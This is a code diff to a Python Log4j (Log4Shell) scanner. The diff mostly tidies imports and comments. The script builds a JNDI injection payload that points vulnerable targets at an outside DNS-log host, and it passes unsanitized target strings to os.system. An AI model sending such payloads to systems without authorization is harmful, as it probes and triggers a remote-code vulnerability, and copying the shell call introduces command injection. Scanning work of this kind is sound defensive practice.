@@ -1,10 +1,10 @@
 #!/usr/bin/python3
 # coding: utf-8
 
-import subprocess
 import requests
 import os
 import json
+import sys
 import time
 import queue
 import warnings
@@ -27,7 +27,6 @@ class ArgumentParse:
                 for url in f.readlines():
                     self.args.urls.append(url.strip())
 
-        # self.args.chrome_path = self.args.chrome_path if self.args.chrome_path else '/usr/bin/chromium-browser'
         if not self.args.payload:
             self.args.dnslog = Dnslog()
             self.args.payload = '${jndi:ldap://' + self.args.dnslog.domain + '/exp}'
@@ -86,14 +85,10 @@ class Log4Scan:
         self.args = args
         self.queue = queue.Queue()
         self.target = target
-        # self.output_file = NamedTemporaryFile(delete=False).name
 
     def craw(self):
         print('start to craw {}'.format(self.target))
         rad_cmd = 'rad_{os}_amd64.exe'.format(os=current_os) if current_os == 'windows' else './rad_{os}_amd64'.format(os=current_os)
-        # cmd = [rad_cmd, "--json-output", "{}.json".format(self.target), '--target', self.target]
-        # rsp = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        # output = str(rsp.stdout, encoding='utf-8')
         cmd = '{rad_cmd} --json-output {target}.json --target {target}'.format(rad_cmd=rad_cmd, target=self.target)
         status = os.system(cmd)
 
@@ -176,9 +171,9 @@ class Log4Scan:
 
 
 if __name__ == '__main__':
-    # if len(sys.argv) <= 1:
-    #     print('\n%s -h for help.' % (sys.argv[0]))
-    #     exit(0)
+    if len(sys.argv) <= 1:
+        print('\n%s -h for help.' % (sys.argv[0]))
+        exit(0)
 
     print('''
              _                _  _   _ ____      ____
